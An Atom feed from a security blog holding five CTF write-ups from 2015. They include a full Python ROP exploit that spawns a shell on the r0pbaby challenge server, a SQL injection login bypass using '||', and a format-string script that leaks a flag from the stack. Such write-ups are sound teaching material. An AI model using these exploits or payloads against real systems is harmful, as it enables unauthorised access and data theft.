<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-06-28T19:53:34+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
    <updated>2015-05-29T23:07:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
</code></pre>

<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<pre><code class="python">import socket, struct, re, time

def p(x):
    return struct.pack('&lt;Q', x)

def get_function(s, name):
    s.send('2\n')
    s.send(name+'\n')
    time.sleep(0.50)
    data = s.recv(1000)

    m = re.findall('(0x0000.*)', data)
    print m
    return int(m[0], 16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))

print s.recv(1000)
print s.recv(1000)

# get some address where we'll store the shellcode
SYSTEM = get_function(s, "system")
READ = get_function(s, "read")
MPROTECT = get_function(s, "mprotect")

# this offset was found like so:
# $ nm -D ./libc-2.19.so |grep mprotect
# 00000000000f4a20 W mprotect
LIBC_BASE = MPROTECT - 0xf4a20

print "[!] libc_base  = 0x%X" % LIBC_BASE
print "[!] system()   = 0x%X" % SYSTEM
print "[!] read()     = 0x%X" % READ
print "[!] mprotect() = 0x%X" % MPROTECT

POPRDX = LIBC_BASE + 0x000bcee0
POPRAX = LIBC_BASE + 0x00048858
POPRSI = LIBC_BASE + 0x00024805
POPRDI = LIBC_BASE + 0x00022b1a
SYSCAL = LIBC_BASE + 0x000c1e55
MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret

# kick off ROP chain
s.send('3\n')
print s.recv(1000)


# build ROP chain
# first, mprotect() a certain area
payload = "A"*8
payload += p(POPRDX)
payload += p(7)
payload += p(POPRSI)
payload += p(0x1000)
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(POPRAX)
payload += p(10)
payload += p(SYSCAL)

# secondly, write '/bin' to memory via MOVMEM gadget
payload += p(POPRDX)
payload += p(0x6e69622f)
payload += p(POPRAX)
payload += p(LIBC_BASE)
payload += p(MOVMEM)

# thirdly, write '//sh' to memory
payload += p(POPRDX)
payload += p(0x68732f2f)
payload += p(POPRAX)
payload += p(LIBC_BASE+4)
payload += p(MOVMEM)

# finally, return-to-system and invoke a shell
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(SYSTEM)

length = "%d" % (len(payload)+1)
print "[!] sending " + length + " bytes"
s.send(length + '\n')

time.sleep(0.5)
s.send(payload + '\n')

print s.recv(1000)

# interact with the shell
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<p>Putting it all together:</p>

<p><img src="/assets/legitbs/r0pbaby.png" alt="" /></p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
    <updated>2015-04-02T20:10:52+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>

<!-- more -->


<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>

<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>

<pre><code class="bash">curl http://hack.bckdr.in/JUDGE/index.php --data "username=testz0r' or 'a'='a&amp;password=testz0r"
&lt;!DOCTYPE html&gt;

&lt;html&gt;

&lt;head&gt;
&lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
An Error occured
</code></pre>

<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>

<pre><code class="bash">$ curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&amp;password=testz0r"
&lt;!DOCTYPE html&gt;

&lt;html&gt;

&lt;head&gt;
&lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
Flag is [REDACTED]
</code></pre>

<p>Done! One filter bypass was all it took.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - LHC]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc/"/>
    <updated>2015-04-02T19:59:55+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc</id>
    <content type="html"><![CDATA[<p><code>LHC</code> was a short &amp; sweet challenge in Backdoor CTF. It had a nice &lsquo;aha-Erlebnis&rsquo; moment.</p>

<!-- more -->


<p>During the CTF, the organizers dropped this challenge. The description mentioned that the flag was hidden in a data file. This data file was kindly provided by the Large Hadron Collider and was 2049 GB large.</p>

<p>I&rsquo;ll let that sink in.</p>

<p>Two-thousand and forty nine <strong>gigabytes</strong>. Downloading it would take more than twenty days. The flag was in the middle of the file, but that still meant downloading more than a terabyte of data.</p>

<p>I fired up <code>curl</code> and looked at the download:</p>

<pre><code>bas@tritonal:~/tmp/bckdr/medusa$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt &gt; /dev/null
* About to connect() to lhc-cdn.herokuapp.com port 443 (#0)
*   Trying 107.21.223.88...
...snip...
&gt; GET /data.txt HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: lhc-cdn.herokuapp.com
&gt; Accept: */*
&gt; 
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 200 OK
&lt; Server: Cowboy
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; Accept-Ranges: bytes
&lt; Content-Type: text/plain; charset=utf-8
&lt; Content-Length: 2200000000000
&lt; Date: Wed, 01 Apr 2015 21:44:48 GMT
&lt; Via: 1.1 vegur
</code></pre>

<p>Yup, 2200000000000 bytes of data. But wait! <code>curl</code> has the option to resume a broken download; that meant that I could control where the download would start. I issued this command and started searching the output for the flag:</p>

<pre><code class="bash">$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1100000000000 &gt; lhc-middle
...snip...
$ strings -n 20 ./lhc-middle
</code></pre>

<p>This gave me part of the flag; the description said it was in the middle of the datafile, so I subtracted another 1000 bytes:</p>

<pre><code>$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1099999998999 &gt; lhc-middle
$ strings lhc-middle -n 20
              The flag is: [REDACTED]
</code></pre>

<p>Simple, really, once you know the trick.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - QR]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr/"/>
    <updated>2015-04-02T19:43:08+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr</id>
    <content type="html"><![CDATA[<p>For this challenge, we had to decode a ton of QR images given to us via a <code>nc</code> connection for 70 points. Sounds like fun!</p>

<!-- more -->


<p>Upon connecting to the service, it tells us we need to decode as much flags as we can. We also get the first flag.</p>

<p><img src="/assets/bckdr/qr-00.png" alt="" />
Right, so I turned to the solution to <a href="https://ctf-team.vulnhub.com/advent-ctf-2014-qr-garden/">QR Garden by Swappage</a>. I liked his approach and decided to do something similar. I installed <code>zbar</code> on my box and cobbled together a python script. That script would connect to the QR service, write out the QR code to disk using <code>PIL</code> and then call <code>zbarimg</code> to decode the QR code. I had some issues at the start because I mixed up the colors of the QR code, but then I was decoding them all pretty rapidly.</p>

<pre><code class="python">from socket import *
from PIL import Image
from os import popen
import re, time, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def getQR(qr):
    im = Image.new("RGB", (94, 94), 'white')

    pixels = im.load()
    print len(qr)
    y = 0
    x = 0
    i = 0
    while i &lt; len(qr):
        if ord(qr[i]) == 0xe2:
            pixels[x,y] = (0, 0, 0)
            pixels[x,y+1] = (0, 0, 0)
            x += 1
        if ord(qr[i]) == 0x20:
            pixels[x,y] = (255, 255, 255)
            pixels[x,y+1] = (255, 255, 255)
            x += 1
        if ord(qr[i]) == 0xa:
            x = 0
            y += 2
        i += 1

    # write out QR to disk  
    im.save('qr.png')

    # ugly hack because ctf
    popen('zbarimg ./qr.png &gt; qr.out')

    with open('qr.out') as f:
        data = f.readline()
        f.close()

    m = re.findall(r'Code:([0-9a-f]*)', data)
    return m[0]

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("hack.bckdr.in", 8010))

    readtil('can') # banner

    try:
        while 1:
            time.sleep(0.05)
            qr = readtil(b'\x0a                                          ')
            #print qr
            sendln(getQR(qr))
            response = s.recv(200)
            print response
    except KeyboardInterrupt:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        s.close()

pwn()
</code></pre>

<p>The script was receiving and decoding QR codes quite rapidly, but I didn&rsquo;t receive any flags. I finally just fired up <code>wireshark</code> to grab the flag from the TCP stream:</p>

<p><img src="/assets/bckdr/qr-01.png" alt="" /></p>

<p>Not the most elegant way to grab the flag, but hey, it worked.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
    <updated>2015-04-02T19:23:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>

<!-- more -->


<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>

<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>

<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>

<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: TEAM%llp
Enter flag: FLAG%llp
TEAM0x64 : incorrect flag. Try again.
</code></pre>

<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>

<pre><code>Breakpoint 1, 0x08048711 in ?? ()
gdb-peda$ x/40wx $esp
0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
</code></pre>

<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>

<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
                          flag1 &gt;&gt;&gt;   g a l f           1
</code></pre>

<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>

<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: %10$p
Enter flag: bleh
0x67616c66 : incorrect flag. Try again.
</code></pre>

<p>It worked remotely with this script:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn(n):
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('hack.bckdr.in', 8004))

    readtil('teamname: ')
    sendln("AAAA%"+str(n)+"$p")
    readtil('flag: ')
    sendln("CTF_TEAM_VULNHUB")
    data = readtil('again.')

    s.close()
    m = re.findall(r'0x([0-9a-f]*) :', data)
    return m[0]

full = ''
for i in xrange(10, 30):
    full += pwn(i).decode('hex')[::-1]
    print full
</code></pre>

<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>

<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
]]></content>
  </entry>
  
</feed>
